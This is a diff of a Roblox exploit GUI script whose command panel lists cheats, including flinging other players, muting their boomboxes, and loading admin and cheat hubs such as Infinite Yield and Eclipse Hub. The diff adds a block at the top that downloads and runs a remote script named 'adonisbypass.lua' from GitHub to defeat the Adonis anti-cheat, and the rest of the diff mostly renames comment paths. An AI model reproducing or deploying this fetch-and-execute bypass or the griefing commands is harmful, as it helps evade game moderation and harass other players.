@@ -7,17 +7,26 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 134 | Scripts: 2 | Modules: 0 | Tags: 0
+-- Instances: 170 | Scripts: 2 | Modules: 0 | Tags: 0
+
+task.spawn(function()
+	for _, rems in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
+		if rems:IsA("RemoteEvent") and rems:FindFirstChild("__FUNCTION") then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/adonisbypass.lua"))()
+		end
+	end
+end)
+
 local G2L = {};
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh
 G2L["1"] = Instance.new("ScreenGui", gethui and gethui() or game:GetService("CoreGui"));
 G2L["1"]["DisplayOrder"] = 2147483647;
 G2L["1"]["Name"] = [[GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh]];
 G2L["1"]["ResetOnSpawn"] = false;
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame
 G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["ZIndex"] = 2147483647;
 G2L["2"]["BorderSizePixel"] = 0;
@@ -27,7 +36,7 @@ G2L["2"]["Position"] = UDim2.new(0.74777, 0, 0.53332, 0);
 G2L["2"]["Name"] = [[MainFrame]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input
 G2L["3"] = Instance.new("TextBox", G2L["2"]);
 G2L["3"]["Name"] = [[Input]];
 G2L["3"]["PlaceholderColor3"] = Color3.fromRGB(0, 114, 167);
@@ -47,23 +56,23 @@ G2L["3"]["Text"] = [[]];
 G2L["3"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UICorner
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UICorner
 G2L["4"] = Instance.new("UICorner", G2L["3"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UIStroke
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UIStroke
 G2L["5"] = Instance.new("UIStroke", G2L["3"]);
 G2L["5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["5"]["Color"] = Color3.fromRGB(0, 171, 255);
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UICorner
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UICorner
 G2L["6"] = Instance.new("UICorner", G2L["2"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Line
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Line
 G2L["7"] = Instance.new("Frame", G2L["2"]);
 G2L["7"]["ZIndex"] = 2147483647;
 G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 171, 255);
@@ -72,7 +81,7 @@ G2L["7"]["Position"] = UDim2.new(0.02215, 0, 0.43697, 0);
 G2L["7"]["Name"] = [[Line]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output
 G2L["8"] = Instance.new("TextLabel", G2L["2"]);
 G2L["8"]["TextWrapped"] = true;
 G2L["8"]["ZIndex"] = 2147483647;
@@ -89,28 +98,28 @@ G2L["8"]["Name"] = [[Output]];
 G2L["8"]["Position"] = UDim2.new(0.02215, 0, 0.51261, 0);
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UIStroke
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UIStroke
 G2L["9"] = Instance.new("UIStroke", G2L["8"]);
 G2L["9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["9"]["Color"] = Color3.fromRGB(0, 171, 255);
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UICorner
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UICorner
 G2L["a"] = Instance.new("UICorner", G2L["8"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UIDragDetector
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UIDragDetector
 G2L["b"] = Instance.new("UIDragDetector", G2L["2"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
 G2L["c"] = Instance.new("LocalScript", G2L["2"]);
 G2L["c"]["Name"] = [[Main]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame
 G2L["d"] = Instance.new("Frame", G2L["1"]);
 G2L["d"]["Visible"] = false;
 G2L["d"]["ZIndex"] = 2147483647;
@@ -120,12 +129,12 @@ G2L["d"]["Position"] = UDim2.new(0.09118, 0, 0.33139, 0);
 G2L["d"]["Name"] = [[CmdFrame]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UICorner
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UICorner
 G2L["e"] = Instance.new("UICorner", G2L["d"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Title
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Title
 G2L["f"] = Instance.new("TextLabel", G2L["d"]);
 G2L["f"]["TextWrapped"] = true;
 G2L["f"]["ZIndex"] = 2147483647;
@@ -141,7 +150,7 @@ G2L["f"]["Name"] = [[Title]];
 G2L["f"]["Position"] = UDim2.new(0.04286, 0, 0, 0);
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame
 G2L["10"] = Instance.new("Frame", G2L["d"]);
 G2L["10"]["ZIndex"] = 2147483647;
 G2L["10"]["BorderSizePixel"] = 0;
@@ -150,7 +159,7 @@ G2L["10"]["Size"] = UDim2.new(0.94056, 0, 0.79623, 0);
 G2L["10"]["Position"] = UDim2.new(0.03165, 0, 0.16912, 0);
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll
 G2L["11"] = Instance.new("ScrollingFrame", G2L["10"]);
 G2L["11"]["Active"] = true;
 G2L["11"]["ZIndex"] = 2147483647;
@@ -164,12 +173,12 @@ G2L["11"]["Position"] = UDim2.new(0, 0, 0.00313, 0);
 G2L["11"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.UIListLayout
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.UIListLayout
 G2L["12"] = Instance.new("UIListLayout", G2L["11"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex
 G2L["13"] = Instance.new("TextButton", G2L["11"]);
 G2L["13"]["TextWrapped"] = true;
 G2L["13"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -185,13 +194,13 @@ G2L["13"]["Name"] = [[ >dex]];
 G2L["13"]["Text"] = [[ >dex]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex.Info
 G2L["14"] = Instance.new("StringValue", G2L["13"]);
 G2L["14"]["Name"] = [[Info]];
 G2L["14"]["Value"] = [[Command Info: Dex let's you see every instance in the game. (well not every idk why I said every) (some executors may crash when loading this idk for sure though since this is the bypassed version which uses a ton of methods)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch
 G2L["15"] = Instance.new("TextButton", G2L["11"]);
 G2L["15"]["TextWrapped"] = true;
 G2L["15"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -207,13 +216,13 @@ G2L["15"]["Name"] = [[ >punch]];
 G2L["15"]["Text"] = [[ >punch]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch.Info
 G2L["16"] = Instance.new("StringValue", G2L["15"]);
 G2L["16"]["Name"] = [[Info]];
 G2L["16"]["Value"] = [[Command Info: Press K to punch. (It flings people + no cooldown) (Mobile users should use a mobile keyboard script)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy
 G2L["17"] = Instance.new("TextButton", G2L["11"]);
 G2L["17"]["TextWrapped"] = true;
 G2L["17"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -229,13 +238,13 @@ G2L["17"]["Name"] = [[ >iy]];
 G2L["17"]["Text"] = [[ >iy]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy.Info
 G2L["18"] = Instance.new("StringValue", G2L["17"]);
 G2L["18"]["Name"] = [[Info]];
 G2L["18"]["Value"] = [[Command Info: Executes the popular admin script, Infinite Yield.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx
 G2L["19"] = Instance.new("TextButton", G2L["11"]);
 G2L["19"]["TextWrapped"] = true;
 G2L["19"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -251,13 +260,13 @@ G2L["19"]["Name"] = [[ >cmdx]];
 G2L["19"]["Text"] = [[ >cmdx]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx.Info
 G2L["1a"] = Instance.new("StringValue", G2L["19"]);
 G2L["1a"]["Name"] = [[Info]];
 G2L["1a"]["Value"] = [[Command Info: Another popular admin script called CMD X.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds
 G2L["1b"] = Instance.new("TextButton", G2L["11"]);
 G2L["1b"]["TextWrapped"] = true;
 G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -273,13 +282,13 @@ G2L["1b"]["Name"] = [[ >cmds]];
 G2L["1b"]["Text"] = [[ >cmds]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds.Info
 G2L["1c"] = Instance.new("StringValue", G2L["1b"]);
 G2L["1c"]["Name"] = [[Info]];
 G2L["1c"]["Value"] = [[Command Info: Opens the Commands List]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds
 G2L["1d"] = Instance.new("TextButton", G2L["11"]);
 G2L["1d"]["TextWrapped"] = true;
 G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -295,13 +304,13 @@ G2L["1d"]["Name"] = [[ >uncmds]];
 G2L["1d"]["Text"] = [[ >uncmds]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds.Info
 G2L["1e"] = Instance.new("StringValue", G2L["1d"]);
 G2L["1e"]["Name"] = [[Info]];
 G2L["1e"]["Value"] = [[Command Info: Closes the Command List]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling
 G2L["1f"] = Instance.new("TextButton", G2L["11"]);
 G2L["1f"]["TextWrapped"] = true;
 G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -317,13 +326,13 @@ G2L["1f"]["Name"] = [[ >spinfling]];
 G2L["1f"]["Text"] = [[ >spinfling]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling.Info
 G2L["20"] = Instance.new("StringValue", G2L["1f"]);
 G2L["20"]["Name"] = [[Info]];
 G2L["20"]["Value"] = [[Command Info: Spins you very fast with velocity that you fling people.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling
 G2L["21"] = Instance.new("TextButton", G2L["11"]);
 G2L["21"]["TextWrapped"] = true;
 G2L["21"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -339,13 +348,13 @@ G2L["21"]["Name"] = [[ >unspinfling]];
 G2L["21"]["Text"] = [[ >unspinfling]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling.Info
 G2L["22"] = Instance.new("StringValue", G2L["21"]);
 G2L["22"]["Name"] = [[Info]];
 G2L["22"]["Value"] = [[Command Info: This turns off Spin Fling]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>
 G2L["23"] = Instance.new("TextButton", G2L["11"]);
 G2L["23"]["TextWrapped"] = true;
 G2L["23"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -361,13 +370,13 @@ G2L["23"]["Name"] = [[ >fling/<player name>]];
 G2L["23"]["Text"] = [[ >fling/<player name>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>.Info
 G2L["24"] = Instance.new("StringValue", G2L["23"]);
 G2L["24"]["Name"] = [[Info]];
 G2L["24"]["Value"] = [[Command Info: Does not require a tool unlike others.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>
 G2L["25"] = Instance.new("TextButton", G2L["11"]);
 G2L["25"]["TextWrapped"] = true;
 G2L["25"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -383,13 +392,13 @@ G2L["25"]["Name"] = [[ >noclipfling/<player name>]];
 G2L["25"]["Text"] = [[ >noclipfling/<player name>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>.Info
 G2L["26"] = Instance.new("StringValue", G2L["25"]);
 G2L["26"]["Name"] = [[Info]];
 G2L["26"]["Value"] = [[Command Info: Flings people who have noclip on. (not anti fling)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat
 G2L["27"] = Instance.new("TextButton", G2L["11"]);
 G2L["27"]["TextWrapped"] = true;
 G2L["27"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -405,13 +414,13 @@ G2L["27"]["Name"] = [[ >expandchat]];
 G2L["27"]["Text"] = [[ >expandchat]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat.Info
 G2L["28"] = Instance.new("StringValue", G2L["27"]);
 G2L["28"]["Name"] = [[Info]];
 G2L["28"]["Value"] = [[Command Info: Let's you be able to resize the chat + drag it.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>unglitchaudio
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unglitchaudio
 G2L["29"] = Instance.new("TextButton", G2L["11"]);
 G2L["29"]["TextWrapped"] = true;
 G2L["29"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -424,16 +433,16 @@ G2L["29"]["ZIndex"] = 2147483647;
 G2L["29"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["29"]["BackgroundTransparency"] = 1;
 G2L["29"]["Name"] = [[ >unglitchaudio]];
-G2L["29"]["Text"] = [[ >unglitchaudio]];
+G2L["29"]["Text"] = [[>unglitchaudio]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>unglitchaudio.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unglitchaudio.Info
 G2L["2a"] = Instance.new("StringValue", G2L["29"]);
 G2L["2a"]["Name"] = [[Info]];
 G2L["2a"]["Value"] = [[Command Info: Added the missing command for disabling glitched boombox on everyone]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>
 G2L["2b"] = Instance.new("TextButton", G2L["11"]);
 G2L["2b"]["TextWrapped"] = true;
 G2L["2b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -449,13 +458,13 @@ G2L["2b"]["Name"] = [[ >eclipsehub/<Premium key or 'nil'>]];
 G2L["2b"]["Text"] = [[ >eclipsehub/<Premium key or 'nil'>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>.Info
 G2L["2c"] = Instance.new("StringValue", G2L["2b"]);
 G2L["2c"]["Name"] = [[Info]];
 G2L["2c"]["Value"] = [[Command Info: Eclipse Hub has a lot for Murder Mystery 2 which is what I mostly use it for. (optional premium key argument BUT you have to put 'nil' if you don't have one)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>
 G2L["2d"] = Instance.new("TextButton", G2L["11"]);
 G2L["2d"]["TextWrapped"] = true;
 G2L["2d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -471,13 +480,13 @@ G2L["2d"]["Name"] = [[ >muteradio/<player name>]];
 G2L["2d"]["Text"] = [[ >muteradio/<player name>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>.Info
 G2L["2e"] = Instance.new("StringValue", G2L["2d"]);
 G2L["2e"]["Name"] = [[Info]];
 G2L["2e"]["Value"] = [[Command Info: Mutes someone boombox temporarily. (More info once command is used in output box)]];
 
 
